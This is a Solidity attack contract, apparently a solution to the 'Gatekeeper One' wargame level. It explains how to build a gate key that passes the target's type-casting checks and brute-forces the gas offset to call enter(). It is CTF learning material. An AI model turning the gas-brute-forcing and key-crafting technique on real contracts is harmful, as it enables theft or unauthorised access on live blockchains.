// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOneAttack {
  address immutable gatekeepOneAddr;
  constructor(address _gatekeeperOneAddr) {
    gatekeepOneAddr = _gatekeeperOneAddr;
  }

  function attack(bytes8 _gateKey) external {
    
    // _gateKey is bytes8 = 64bits (e.g. 0x1111222233334444)

    // uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)
    // last 32 bits = last 16 bits
    // 33334444 = 4444
    // position in 3333 must be 0

    // uint32(uint64(_gateKey)) != uint64(_gateKey)
    // last 32 bits != whole number
    // first 32 bits = anything but 0

    // uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)
    // last 32 bits = last 16 bits of address

    for (uint256 i = 0; i < 8191; i++) {  // loop 
      (bool result, ) = gatekeepOneAddr.call{gas: 24000 + i}( 
        abi.encodeWithSignature(("enter(bytes8)"), _gateKey)
      );
      if (result) { 
        break;  
      }
    }
  }
}